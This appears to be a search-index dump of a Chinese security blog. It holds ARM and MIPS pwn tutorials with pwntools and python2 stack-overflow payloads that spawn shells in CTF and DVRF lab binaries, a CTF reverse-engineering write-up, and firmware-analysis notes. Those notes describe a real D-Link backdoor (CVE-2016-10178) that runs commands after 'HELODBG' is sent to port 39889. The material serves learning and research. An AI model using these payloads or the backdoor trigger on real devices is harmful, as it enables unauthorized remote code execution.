p.sendline(payload2)p.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/categories/pwn/"}],"tags":[{"name":"栈溢出","slug":"栈溢出","permalink":"http://example.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"}],"keywords":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/categories/pwn/"}]},{"title":"armpwn入门","slug":"armpwn入门","date":"2022-07-04T16:00:00.000Z","updated":"2022-07-05T13:57:05.731Z","comments":true,"path":"2022/07/05/armpwn入门/","link":"","permalink":"http://example.com/2022/07/05/armpwn%E5%85%A5%E9%97%A8/","excerpt":"","text":"调试 常用命令info functions ：显示程序的使用的函数 disassemble 函数名 ：反汇编指定函数 查看内存命令x&#x2F;&lt;n&#x2F;f&#x2F;u&gt; n是一个正整数，表示显示内存的长度f 表示显示的格式 u表示从当前地址往后请求的字节数(u参数可以用下面的字符来代替b表示单字节，h表示双字节，w表示四字节，g表示八字节) 编译arm架构程序并用qemu执行1234#编译arm-linux-gnueabihf-gcc -g hello.c -o eastgets#qemu执行 动态链接程序，需要指定libc的位置qemu-arm -L /usr/arm-linux-gnueabihf/ ./eastgets typo(例题) 32位arm小端，静态编译，没有符号表 恢复符号表对于静态编译的 bianry， 可以使用 lscan, flirt, rizzo, bindiff 等多种方法恢复部分符号表 https://www.freebuf.com/articles/terminal/134980.html arm架构的libc在 &#x2F;usr&#x2F;arm-linux-gnueabihf&#x2F;lib里面 尝试恢复符号表： （1）下载对应libc.so sudo apt install libc6-armhf-cross cp &#x2F;usr&#x2F;arm-linux-gnueabihf&#x2F;lib&#x2F;libc-2.23.so .&#x2F; （2）下载rizzo插件 使用rizzo插件： https://github.com/fireundubh/IDA7-Rizzo 放入：C:\\Program Files\\IDA 7.0\\plugins （3）用IDA打开libc-2.23.so 导出libc.23.so.riz: File-&gt;Produce file-&gt;Rizzo signature file （4）打开目标程序 加载.riz: File-&gt;Load file-&gt;Rizzo signature file 溢出函数 arm架构下32bit程序，函数的前四个参数分别保存在r0~r3寄存器中，其余的参数在栈中，函数返回值 保存在寄存器r0中。 找到0x20904，将“&#x2F;bin&#x2F;sh”地址赋给r0，并将system的地址赋给pc，就可以执行system(“&#x2F;bin&#x2F;sh”) 12345678from pwn import *payload = &quot;A&quot;*112 + p32(0x20904) + p32(0x6c384)*2 + p32(0x110b4)p = process(&quot;./typo&quot;)p.recvuntil(&quot;quit&quot;)p.send(&quot;\\n&quot;)p.recvuntil(&quot;----&quot;)p.sendline(payload)p.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/categories/pwn/"}],"tags":[{"name":"arm","slug":"arm","permalink":"http://example.com/tags/arm/"}],"keywords":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/categories/pwn/"}]},{"title":"mips基础","slug":"Mips基础","date":"2022-07-02T16:00:00.000Z","updated":"2022-07-28T12:46:00.837Z","comments":true,"path":"2022/07/03/Mips基础/","link":"","permalink":"http://example.com/2022/07/03/Mips%E5%9F%BA%E7%A1%80/","excerpt":"","text":"基本特点 寄存器 流水线操作 寻址方式 指令格式 指令集基础运算 逻辑运算 移位运算 访存 跳转 CPU控制指令 其他指令 MIPS 汇编 | FreeFlyingSheep 的小站","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[{"name":"mips","slug":"mips","permalink":"http://example.com/tags/mips/"}],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"arm基础","slug":"arm基础","date":"2022-06-30T16:00:00.000Z","updated":"2022-07-01T13:39:44.089Z","comments":true,"path":"2022/07/01/arm基础/","link":"","permalink":"http://example.com/2022/07/01/arm%E5%9F%BA%E7%A1%80/","excerpt":"","text":"arm工作模式ARM之所以设计出这么多种模式出来，就是为了「应对CPU在运行时各种突发事件」，比如要支持正常的应用程序的运行，在运行任何一个时间点又可能发生很多异常事件，比如：关机、收到网卡信息、除数为0、访问非法内存、解析到了非法指令等等，不光要能处理这些异常还要能够从异常中再返回到原来的程序继续执行。 两种工作状态1、ARM状态：32位，ARM状态执行字对齐的32位ARM指令。 2、Thumb状态，16位，执行半字对齐的16位指令。 注：1、ARM和Thumb两种状态之间的切换不影响处理器的工作模式和寄存器的内容。 ​ 2、ARM处理器在处理异常时，不管处理器处于什么状态，则都将切换到ARM状态。 寄存器 通用寄存器包括R0~R15,可以分为3类: 未分组寄存器R0~R7 分组寄存器R8~R14、R13(SP) 、R14(LR) 程序计数器PC(R15)、R8_fiq-R12_fir为快中断独有 1. 未分组寄存器R0~R7在所有运行模式下,未分组寄存器都指向同一个物理寄存器,它们未被系统用作特殊的用途.因此在中断或异常处理进行运行模式转换时,由于不同的处理器运行模式均使用相同的物理寄存器,所以可能造成寄存器中数据的破坏。 2. 分组寄存器R8~R14对于分组寄存器,它们每一次所访问的物理寄存器都与当前处理器的运行模式有关。 对于R8R12来说,每个寄存器对应2个不同的物理寄存器,当使用FIQ(快速中断模式)时,访问寄存器 R8_fiqR12_fiq;当使用除FIQ模式以外的其他模式时,访问寄存器R8_usr~R12_usr。 对于R13,R14来说,每个寄存器对应7个不同的物理寄存器,其中一个是用户模式与系统模式共用,另外6个物理寄存器对应其他6种不同的运行模式,并采用以下记号来区分不同的物理寄存器: 1R13_mode R14_mode 其中mode可为:「usr,fiq,irq,svc,abt,und，mon」。 3. 寄存器R13（sp）在ARM指令中常用作「堆栈指针」,用户也可使用其他的寄存器作为堆栈指针,而在Thumb指令集中,某些指令强制性的要求使用R13作为堆栈指针。 寄存器R13在ARM指令中常用作堆栈指针，但这只是一种习惯用法，用户也可使用其他的寄存器作为堆栈指针。而在Thumb指令集中，某些指令强制性的要求使用R13作为堆栈指针。 由于处理器的每种运行模式均有自己独立的物理寄存器R13，在用户应用程序的初始化部分，一般都要初始化每种模式下的R13，使其指向该运行模式的栈空间。这样，当程序的运行进入异常模式时，可以将需要保护的寄存器放入R13所指向的堆栈，而当程序从异常模式返回时，则从对应的堆栈中恢复，采用这种方式可以保证异常发生后程序的正常执行。 4. R14（LR）链接寄存器(Link Register)当执行子程序调用指令(BL)时,R14可得到R15(程序计数器PC)的备份。 在每一种运行模式下，都可用R14保存子程序的返回地址，当用BL或BLX指令调用子程序时，将PC的当前值复制给R14，执行完子程序后，又将R14的值复制回PC，即可完成子程序的调用返回。以上的描述可用指令完成。 从子程序返回：「方法1：」 123 MOV PC, LR或者 BX LR 「方法2：」 在子程序入口处使用以下指令将R14存入堆栈： 1STMFD SP！,&#123;,LR&#125; 对应的，使用以下指令可以完成子程序返回： 1LDMFD SP！,&#123;,PC&#125; 5. R15(PC)程序状态寄存器寄存器R15用作程序计数器(PC),在ARM状态下,位[1:0]为0,位[31:2]用于保存PC,在Thumb状态下,位[0]为0,位[31:1]用于保存PC。 比如如果pc的值是0x40008001,那么在寻址的时候其实会查找地址0x40008000，低2位会自动忽略掉。「个中原因，请读者自己思考?」 由于ARM体系结构采用了多级流水线技术，对于ARM指令集而言，PC总是指向当前指令的下两条指令的地址,即PC的值为当前指令的地址值加8个字节。 1即：PC值=当前程序执行位置+8 6. CPSR、SPSR「CPSR」(Current Program Status Register，当前程序状态寄存器)，CPSR可在任何运行模式下被访问，它包括条件标志位、中断禁止位、当前处理器模式标志位，以及其他一些相关的控制和状态位。 每一种运行模式下又都有一个专用的物理状态寄存器，称为「SPSR」(Saved Program Status Register，备份的程序状态寄存器)，当异常发生时，SPSR用于保存CPSR的当前值，从异常退出时则可由SPSR来恢复CPSR。 由于用户模式和系统模式不属于异常模式，它们没有SPSR，当在这两种模式下访问SPSR，结果是未知的。 寄存器CPSR格式如下： 条件码标志(condition code flags) 「N,Z,C,V」均为条件码标志位,它们的内容可被算术或逻辑运算的结果所改变,并且可以决定某条指令是否被执行。 在ARM状态下,绝大多数的指令都是有条件执行的,在Thumb状态下,仅有分支指令是有条件执行的。 「N (Number)」: 当用两个补码表示的带符号数进行运算时,N&#x3D;1表示运行结果为负,N&#x3D;0表示运行结果为正或零 「Z :(Zero)」: Z&#x3D;1表示运算结果为零,Z&#x3D;0表示运行结果非零 「C」 : 可以有4种方法设置C的值： (Come)加法运算(包括CMP):当运算结果产生了进位时C&#x3D;1,否则C&#x3D;0 减法运算(包括CMP):当运算产生了借位,C&#x3D;0否则C&#x3D;1 对于包含移位操作的非加&#x2F;减运算指令 ,C为移出值的最后一位 对于其他的非加&#x2F;减运算指令C的值通常不改变 「V」 :(oVerflow)对于加&#x2F;减法运算指令,当操作数和运算结果为二进制的补码表示的带符号位溢出时,V&#x3D;1表示符号位溢出;对于其他的非加&#x2F;减运算指令V的值通常不改变 「Q」： 在ARM V5及以上版本的E系列处理器中，用Q标志位指示增强的DSP运算指令是否发生了溢出。在其它版本的处理器中，Q标志位无定义 「J：」仅ARM v5TE-J架构支持 , T&#x3D;0;J &#x3D; 1 处理器处于Jazelle状态,也可以和其他位组合. 「E位：」 大小端控制位 「A位：」 A&#x3D;1 禁止不精确的数据异常 「T :」 T &#x3D; 0;J&#x3D;0; 处理器处于 ARM 状态 T &#x3D; 1;J&#x3D;0 处理器处于 Thumb 状态 T &#x3D; 1;J&#x3D;1 处理器处于 ThumbEE 状态 控制位 CPSR的低8位(包括I,F,T和M[4:0])称为控制位,当发生异常时这些位可以被改变,如果处理器运行特权模式,这些位也可以由程序修改。 「中断禁止位I,F」【重要】 I&#x3D;1 禁止IRQ中断 F&#x3D;1 禁止FIQ中断 比如我们要想在程序中实现禁止中断，那么就需要将CPSR[7]置1。 运行模式位[4-0] bite 模式 ARM模式可访问的寄存器 注意观察这5个bit的特点，最高位都是1，低4位的值则各不相同，这个很重要，要想搞清楚uboot、linux的源码，尤其是异常操作的代码，必须要知道这几个bit的值。 流水线 关键指令 跳转 伪代码","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[{"name":"arm","slug":"arm","permalink":"http://example.com/tags/arm/"}],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"dropper","slug":"dropper","date":"2022-06-29T01:49:45.000Z","updated":"2022-06-29T15:58:39.854Z","comments":true,"path":"2022/06/29/dropper/","link":"","permalink":"http://example.com/2022/06/29/dropper/","excerpt":"","text":"Dropper 什么是Dropper Dropper是将程序嵌入到自己的内部。 类似于双进程，运行后解密了资源表的数据，本题是一个exe文件，然后作为子进程被创建了 解题 开始一个UPX壳，upx -d 的话无法运行 ，手动去壳,试了很多遍， rax会运行错误。 静态分析： （如果不给题目名称如何看出是dropper技术 进入，上面几个qword是函数调用但是识别失败。最后一个异或0x73，解密资源的地方，接着主程序后面就是创建一个进程，并把刚刚解密出的pe文件手动装载进行内存，然后恢复执行。 下面我们用Process-Dump来dump出子程序 如何使用Process Dump 1pd64.exe -pid **** dump出我们需要的子程序， 主要逻辑为一个int a[500]的数组来实现这个大数的存储及运算 这里的第88行*14 通过交叉引用可以推断出是什么，其初始化在Sub_7FF7D0F21433, 将sub_7FF7D0F2167C的地址赋给前四个字节 sub_7FF7D0F2167C函数主要两个功能，对数值的转换，然后check 对大数的运算 调试提取数据，有一个除0异常，直接跳过即可。 12345678910111213141516171819202122232425262728293031323334import base64enc = [0x000020F1, 0x00001DA9, 0x00000156, 0x00000B37, 0x000007C0, 0x0000066A, 0x000024E0, 0x00000D42, 0x00002077, 0x000007EC, 0x00001BA7, 0x00002071, 0x000000F8, 0x00000291, 0x000003DA, 0x0000157C, 0x00001EF4, 0x00002519, 0x00000C25, 0x00002062, 0x00002253, 0x00000640, 0x000008DF, 0x00001E34, 0x00002140, 0x00000F92, 0x0000039B, 0x0000126F, 0x00002403, 0x00000E65, 0x000001F0, 0x00001868, 0x0000016D, 0x000006B6, 0x00002214, 0x00001603, 0x00001925, 0x000016AE, 0x000012D0, 0x00001831, 0x0000018C, 0x00000BF7, 0x00000E97, 0x000000CE, 0x0000061C, 0x00000390, 0x000019E9, 0x000022A5, 0x00001601, 0x00001A1E, 0x000013D1, 0x00000DBC, 0x0000117D, 0x0000225F, 0x00002272, 0x0000007B, 0x000023E6, 0x0000069F, 0x000002D3, 0x00001BEF, 0x000003E6, 0x000017D4, 0x00002284, 0x000003B8, 0x00000251, 0x00001646, 0x00000176, 0x0000081E, 0x000024C3, 0x00001E85, 0x00001097, 0x00001264, 0x00000A34, 0x00001A3B, 0x00000FE7, 0x000026A6, 0x00001F43, 0x00001832, 0x000021AE, 0x0000023C, 0x000004C2, 0x00002585, 0x000017E7, 0x000015DD, 0x00002610, 0x00001B86, 0x00000D2A, 0x00000716, 0x00001C25, 0x00002099]data = [[0x000024AC, 0x00000116, 0x000004F4, 0x00000B64, 0x00001DC3, 0x00001B4A, 0x000001B2, 0x00001FCE, 0x00000E81, 0x000025AB, 0x0000015B, 0x0000252D, 0x000002AC, 0x00000F77, 0x000022F5, 0x000019E3, 0x00001C53, 0x00000B66, 0x000011BC, 0x0000193A], [0x00000DC6, 0x00000854, 0x000015F5, 0x00002567, 0x000008FA, 0x00000E20, 0x00000807, 0x00001007, 0x000018CC, 0x00001E84, 0x00001F11, 0x000013D4, 0x0000076A, 0x00001461, 0x00000B0F, 0x00001F70, 0x00001B3D, 0x00001008, 0x00000D52, 0x0000049A], [0x00001A89, 0x00000E42, 0x000000FA, 0x0000100D, 0x000014DD, 0x00001BFC, 0x000026DB, 0x00001AC2, 0x00001CA0, 0x000005ED, 0x00000834, 0x000016BF, 0x00000704, 0x00001FAD, 0x000025FD, 0x00001142, 0x00001EEE, 0x00001E60, 0x00000353, 0x000015A8], [0x00000E17, 0x00000706, 0x00000C1F, 0x00000169, 0x00002248, 0x000007FD, 0x00001768, 0x00001F54, 0x00001574, 0x00002458, 0x00000374, 0x00001D6B, 0x00000918, 0x00000ECF, 0x0000211D, 0x00001D96, 0x00001BEB, 0x00001703, 0x00001B87, 0x000006FA], [0x00000AE3, 0x0000069F, 0x000001EF, 0x00001C15, 0x00001378, 0x000020D1, 0x0000211D, 0x00002275, 0x000005F4, 0x00002475, 0x00000D13, 0x000008EF, 0x00000E10, 0x000006D4, 0x0000215A, 0x000004D6, 0x0000202F, 0x00001B99, 0x00001C86, 0x000002F1], [0x00000680, 0x000000D4, 0x00000677, 0x00001E21, 0x0000220D, 0x00000933, 0x00000973, 0x00001947, 0x00000D61, 0x0000247F, 0x00001D21, 0x00001FA2, 0x00001606, 0x000007B0, 0x00001829, 0x000016C0, 0x000026C9, 0x0000248C, 0x00000C9A, 0x00001F8F], [0x0000257F, 0x00000359, 0x00001831, 0x000021B7, 0x00000BA8, 0x00000FC5, 0x00000BA4, 0x000024E2, 0x00001241, 0x00000D53, 0x00000C82, 0x00001240, 0x00002241, 0x00001156, 0x0000116A, 0x000005F3, 0x000022D5, 0x000008DA, 0x000014A3, 0x0000059E], [0x00001675, 0x00000AA9, 0x00000D8B, 0x00000D31, 0x00001722, 0x000006C8, 0x0000151B, 0x000017D8, 0x00001FEF, 0x00001624, 0x00002307, 0x00000CB9, 0x0000053C, 0x00000230, 0x00001EAA, 0x00001FD1, 0x00000FAD, 0x00001E30, 0x00002345, 0x00001583], [0x000001D1, 0x0000056E, 0x00000AA3, 0x0000223C, 0x000009A4, 0x000006C9, 0x00000112, 0x00001977, 0x00002512, 0x00000B60, 0x0000081A, 0x00000F06, 0x00001329, 0x000011AA, 0x00002404, 0x00000E57, 0x0000011E, 0x000011DC, 0x00002474, 0x00001BC7], [0x000022BE, 0x00001F17, 0x00000588, 0x00001B80, 0x00001479, 0x000016EF, 0x000008CA, 0x00000D6E, 0x0000138F, 0x00001054, 0x000021FA, 0x00000102, 0x000013A6, 0x00000195, 0x000002D1, 0x00002594, 0x00001369, 0x00002534, 0x000015C5, 0x0000168A]]enc1 = 0for i in enc[::-1]: enc1 = enc1*10000+idata1= [0]*10for i, val in enumerate(data): #enumerate() 函数用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，一般用在 for 循环当中 for j in val[::-1]: data1[i] = data1[i]*10000+jenc1 += data1[9]enc1 -= data1[8]enc1 += data1[7]enc1 -= data1[6]enc1 += data1[5]enc1 //= data1[4]enc1 -= data1[3]enc1 += data1[2]enc1 //= data1[1]enc1 -= data1[0]ans = &#x27;&#x27;while enc1: ans += chr(enc1%128) enc1 //= 128print(base64.b64decode(ans))","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"-[ACTF] -[dropper]","slug":"ACTF-dropper","permalink":"http://example.com/tags/ACTF-dropper/"}],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"固件分析初试","slug":"固件逆向分析初试","date":"2022-06-24T11:50:10.000Z","updated":"2022-08-08T13:25:00.254Z","comments":true,"path":"2022/06/24/固件逆向分析初试/","link":"","permalink":"http://example.com/2022/06/24/%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%88%9D%E8%AF%95/","excerpt":"","text":"m U-Boot(Universal Boot Loader)，即通用Bootloader，是德国DENX小组开发的用于多种嵌入式CPU的bootloader程序 Legacy-uImage在kernel镜像的基础上，加上64Byte的信息提供给uboot使用 binwalk分析一下，是Squashfs文件系统 Binwalk如何进行提取：通过maigc特征集与文件进行比对，但识别效率比file命令高多了 binwalk -Me 解压得到 文件系统是操作系统的重要组成部分，是操作运行的基础。不同的路由器使用的文件系统格式不尽相同。根文件系统会被打包成当前路由器所使用的文件系统格式，然后组装到固件中。路由器希望文件系统越小越好，所以这些文件系统中各种压缩格式随处可见。 Squashfs是一个只读格式的文件系统，具有超高压缩率，其压缩率最高可达34%。当系统启动后，会将文件系统保存在一个压缩过的文件系统文件中，这个文件可以使用换回的形式挂载并对其中的文件进行访问，当进程需要某些文件时，仅将对应部分的压缩文件解压缩。 Squashfs文件系统常用的压缩格式有GZIP、LZMA、LZO、XZ（LZMA2）。路由器的根文件系统通常会按照Squashfs文件系统常用压缩格式中的一种进行打包，形成一个完整的Squashfs文件系统，然后与路由器操作系统的内核一起形成更新固件。 由于squashFS可以在不需要解压的情况下直接挂载，因此有许多应用场景，例如： 1、安装Linux时用的live cd 2、小型嵌入式设备中的rootfs。rootfs一般以压缩好的形式存放在ROM中，如果开机时把整个rootfs都解压到内存里再读取，对于ROM和RAM容量一般都很小的小型嵌入式设备来说性价比太低。 0x2 静态分析从Dlink固件里面提取样本，打开发现被加密了。 如生成字典用的crunch、rsmangler，爆破用的frackzip等 直接使用教程的密码beUT9Z，解压如下 .mbn：高通的一套用于加载网络环境的文件（modem software configuration） .yaffs2：针对NAND芯片设计的嵌入式文件系统，可用unyaffs提取 核心应该是2K-mdm-image-mdm9625.yaffs2，用unyaffs提取 1unyaffs 2K-mdm-image-mdm9625.yaffs2 yaffs2-root/ 接下来我们查找该路径下的所有.conf文件，.conf文件多是配置文件，有可能从中可以发现敏感的信息。 1find . -name &#x27;*.conf&#x27; 其中的inadyn-mt.conf文件引起了我们注意，这是no-ip应用的配置文件，no-ip就是一个相当于花生壳的东西，可以申请动态域名。我们从中可以发现泄露的no-ip的登陆账号及密码。 我们还从shadow文件中找到了root账号的密码，通过爆破可以得到root的密码为1234。 接下来使用firmwalker来自动化遍历固件系统中的所有可疑文件。 1git clone https://github.com/craigz28/firmwalker.git Firmwalker是一个bash脚本，用于扫描从IoT固件提取的文件以查看它们是否容易受到攻击。唯一的要求是该工具和提取的固件文件应位于同一文件夹中。 将它们放置在相同的位置后，由Firmwalker生成的输出文件-Firmwalker.text-将突出显示潜在问题的列表，可以是以下任意一个： etc &#x2F; ssl目录etc &#x2F; passwd和etc &#x2F; shadow配置，脚本和其他.bin文件关键字，例如远程，管理员，密码等。常见的二进制文件，例如dropbear，tftp和ssh物联网设备上存在的常见Web服务器随机IP地址，电子邮件ID和URL使用Shodan CLI调用Shodan API的实验功能面临任何这些问题的所有物联网设备都容易受到攻击。 1./firmwalker.sh yaffs2-root/ 除了配置文件外，分析存在风险的二进制程序也很重要。查看自启动的程序，在etc&#x2F;init.d目录下存放启动时运行的程序和脚本，一个start_appmgr脚本引起了我们注意，mgr一般就是主控程序的意思。 查看脚本，该脚本会在开机的时候以服务的形式运行&#x2F;bin&#x2F;appmgr程序。 用IDA打开该文件 发现一个后门，这个漏洞被收录到CVE-2016-10178 只要连接该固件的39889端口并发送HELODBG的字符串，就可以进行远程执行命令。 动态调试采用Attify 1./fat.py &#x27;/home/iot/Documents/DWP2360b-firmware-v206-rc018.bin&#x27; 通过192.168.0.50即可访问固件 调试固件用到了Damn Vulnerable Router Firmware这个项目 先用binwalk解压 提取出来的目录里有个文件夹pwnable，里面存放着漏洞程序示例，选取stack_bof_01程序进行实验，程序的源代码可以在DVRF&#x2F;Pwnable Source&#x2F;Intro&#x2F;里查看 先用readelf查看文件信息，mips架构 小端序。。。 文件的主要逻辑：strcpy造成了栈溢出，存在后门函数。 动调拷贝wmu-mipsel-static到固件根目录 1cp (which qemu-mipsel-static) . 用qemu虚拟运行stack_bof_01： 以调试的方式启动程序，并在1234端口进行监听： 1sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 1111 打开一个新的shell，运行以下命令： 1234567gdb-multiarch pwnable/Intro/stack_bof_01# 设置架构set architecture mips#设置调试端口target remote 127.0.0.1:1234 计算偏移v 12345iot@attifyos ~/D/D/F/_/squashfs-root&gt; python2 -c &quot;print &#x27;a&#x27;*204+&#x27;\\x50\\x09\\x40\\x00&#x27;&quot; &gt;payloadiot@attifyos ~/D/D/F/_/squashfs-root&gt; sudo chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01 (cat payload) 如果直接把跳转地址设置为后门函数dat_shell的起始地址0x400950会触发异常 程序成功跳转至dat_shell，但依旧崩溃,因为我们溢出的时候把 $gp 寄存器也覆盖了，$gp 寄存器是用来全局指针寻址用的，覆盖了他就会导致程序无法正常寻址，自然程序就会 crash。 查询MIPS指令集，MIPS跳转方式： 1.设置t9寄存器数值，跳转到t9寄存器； 2.在执行某个函数之前，将要跳转的地址保存在ra寄存器中，执行函数后可跳转。 qemu不能vmmap。 ida打开libc.so.0 在MIPS中，函数内部会通过t9寄存器和gp寄存器来找数据，地址等。同时在mips的手册内默认$t9的值为当前函数的开始地址， 如果在执行00400958 addu $gp, $t9是手动把$t9改成0x00400950，后面就正常了。 所以现在需要找一个gadget，通过t9跳转过去，这也是mips常规的用法，比如main开头调用memet。 sp：MIPS架构中，栈是向下增长的，也就是栈底在高地址，栈顶在低地址。在图3-2中，GPR[sp]代表通用寄存器sp（$29）指向栈顶，又称sp为栈指针（stack pointer） 其偏移0x6b20处确实有一个gadget 12.text:00006B20 00 00 B9 8F lw $t9, arg_0($sp).text:00006B24 09 F8 20 03 jalr $t9 p &amp;memset #查看memset地址，为0x408b6e10。（友情提示，需要在memset处下断点，运行至memset，不然由于之前没有运行memset，memset地址为其got地址） ida打开libc.so.0，查看memset偏移为0x0001BE10 则libc基地址为：0x408b6e10-0x0001BE10&#x3D;0x4089b000 gadget地址为 ：0x4089b000+0x6b20&#x3D;0x408a1b2 payload 12python2 -c &quot;print &#x27;a&#x27;*204+&#x27;\\x20\\x1b\\x8a\\x40&#x27;+&#x27;\\x50\\x09\\x40\\x00&#x27;&quot; &gt; payloadsudo chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01 (cat payload) getshell 修复固件运行环境有一些固件因为硬件依赖等原因导致qemu和firmadyne之类的软件无法正确模拟 模拟固件运行的实质其实就是把固件的Web程序跑起来，而模拟失败则说明Web程序运行出错了，我们接下来就要看看Web程序报错的原因以及如何修复运行环境。 拿到dir605L_FW_113.bin固件 binwalk解析，进入文件系统目录squashfs-root-0，找到web服务程序Boa （在bin目录下 Boa程序是一个轻量级的web服务器程序，常见于嵌入式系统中。dlink就是在boa开源代码的基础上新增了很多功能接口以实现路由器上的不同功能。boa程序的路径为&#x2F;bin&#x2F;boa，同时我们发现在&#x2F;etc&#x2F;boa路径下还有个boa的密码配置文件，我们可以直接获取到boa加密后的密码。 1234567cp (which qemu-mips-static) .sudo chroot . ./qemu-mips-static bin/boa补充mips 是32位大端字节序mipsel 是32位小端字节序 注：APMIB 是个Realtek（网卡？）的玩意 由于没有flash，导致读mib失败 拖到反编译工具中分析。先定位到字符串“Initialize AP MIB failed!”的位置。注意到在输出这个字符串前有个调用APMIB初始化的跳转，在此下断点， IDA gdbserver远程调试 QEMU的远程调试不需要gdbserver，-g 指定端口，ida 远程调试选项指定相应端口就行 1sudo chroot . ./qemu-mips-static -g 23946 bin/boa BNEZ是branch not equal to zero 条件转移指令，当寄存器中内容不为0时转移发生 apmib_init 函数返回 0 导致了这个错误 编写劫持函数动态库： 在apmib.so函数里面。 直接写一个动态库 apmib_init函数返回 1 劫持 123456#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int apmib_init()&#123; return 1;&#125; 编译 1mips-linux-gnu-gcc -Wall -fPIC -shared apmib.c -o apmib-ld.so 然后运行 -E优先选择我们的so文件 1sudo chroot ./ ./qemu-mips-static -E LD_PRELOAD=&quot;./apmib-ld.so&quot; ./bin/boa 但是依旧报错 再次动调发现我们的 apmib_get 函数时出错了 可以将 apmib.so 直接拖出来 IDA32 分析一下 apmib_get 函数 https://jyhshin.pixnet.net/blog/post/47162002-realtek-apmib-libraryapmib_get(), 讀取 RAM 的 mib 值qemu 模拟不了与硬件交互的情况，所以读取不到 重新写 12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define MIB_IP_ADDR 170#define MIB_HW_VER 0x250#define MIB_CAPTCHA 0x2c1int apmib_init()&#123; return 1;&#125;int fork(void)&#123; return 0;&#125;void apmib_get(int code,int *value)&#123; switch(code)&#123; case MIB_HW_VER: *value=0xf1; break; case MIB_IP_ADDR: *value=0x7f000001; break; case MIB_CAPTCHA: *value=1; break; &#125; return;&#125; 再次编译 查看 Wizard_Easy_LangSelect.asp代码，猜测 hw 是 hardware 缩写，所以应该是跟硬件交互 1234var hw_version=&quot;&lt;%getInfo(&quot;hwVersion&quot;)%&gt;&quot;;var productModel=&quot;&lt;%getInfo(&quot;productModel&quot;)%&gt;&quot;;document.getElementById(&quot;hw_version_head&quot;).innerHTML = hw_version;document.getElementById(&quot;product_model_head&quot;).innerHTML 魔改入口网页 first.asp 12345678910111213141516171819202122232425262728&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;% getLangInfo(&quot;LangPathWizard&quot;);%&gt;&lt;script&gt;function init()&#123; var ecflag = &lt;% getIndexInfo(&quot;enableecflag&quot;) %&gt;; if(ecflag == 0) &#123; if((LangCode == &quot;SC&quot;)||(LangCode == &quot;TW&quot;)) &#123; self.location.href=&quot;Basic/Wizard_Easy_Welcome.asp&quot;; &#125; else &#123; //self.location.href=&quot;Basic/Wizard_Easy_LangSelect.asp&quot;; self.location.href=&quot;Basic/Wizard_Easy_Welcome.asp&quot;; &#125; &#125; else &#123; self.location.href=&quot;index.asp&quot;; &#125;&#125;&lt;/script&gt;&lt;body onLoad=&quot;init();&quot;&gt;&lt;/html&gt; 如此便恢复完毕，网页可以访问。 接下来就可以挖洞了哇","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[{"name":"固件分析","slug":"固件分析","permalink":"http://example.com/tags/%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/"}],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"碎碎念","slug":"碎碎念","date":"2022-05-29T16:00:00.000Z","updated":"2022-08-25T12:41:13.141Z","comments":true,"path":"2022/05/30/碎碎念/","link":"","permalink":"http://example.com/2022/05/30/%E7%A2%8E%E7%A2%8E%E5%BF%B5/","excerpt":"有东西被加密了, 请输入密码查看.","text":"47b49a4a2f06ffaeeb6d37e9691a4c66766fbc2abbcca162abc5974893942ce963e5e612308ca60d3a87bedbb25e81e41ad702e9b2a3c38c66064a5cf1f100c5d7902407618c45289451b84a4a8e5133d8d7b5ebac90d9b6c1c6ebe308d03b0ae8764d29703a4019c2f47ca40df9cbcce1ccfc88f8df0bae7bf39f4438a37bc8b58cdd5b76f3625e0f0b070b4865708dfb983aead32c97d00086f8fef6d6c66fdc0f1a5d7ac185bfdfd2ad917273beffb4f97189a7b13e5cbe3e198e25ce1f39efb929750c7bfc6b0c1530f4e6d000cab40c6445df5e09cde2fbf6e8c05251563ab8770557f0d49b9da00d39f272aa07a4b95868b04bf043632fb97570775fd405bc90f67226134608df3a47153d9661bbf95498ed60e7cb2926693e945aefe1102d555ab5bb2e431bc4c4d11238ca71be1f10bbc738b49fb54c31dcbd735c6d2693bc4190998579b33aab829ab23386e041784f68ebee474dc73405d27bc8cbe6fdfba430ec181460fe3917a0b2f3d597242456b467a898ecf41c9eb98ee3e26f7455ea94f631a5fadddeab048d28a1052875697c463fb5b6af8628f67e51444f1f8e948fadfad1a533b91e30acacde51011d2fbf08515f70169da5204be6f70dda5fbdc8c7e5dbbfe5804677ec6af82b170b175b59f51aaa50d1a0f7de96f40a7f5524b91ebd23155bcd1858aec8d0572f6b6e80b26f34f689d5f8dc6990e28353330dd3be7d82889f9a99a1b6a9b1c5bd472c922daae78a51fbd4a72e547f0d77a7976bbf6a424916893b36b7b55d05ae632c92cc7e257fa037060abef40b3e1ca99df997af9fec915aa01d7fefa76dd0f8bbc618a5ddda2a910141cf84ae10bef97bc2a5cf41a955b134d4dcb1f775f6432769e4705aa37565f7641c90478997a2725bb2fe57cb3095f81e1c9202c0b3061ddf48d031c981a8a91c5a51ec837db9cb71449400cb694c7ea65f5f3b28446b5c71a773e140de635c661f7489050e7fffa5c1ce8057aa3f49fa3d11f42b4570aec6ff22c4fc78004a95141159a962be4e4ff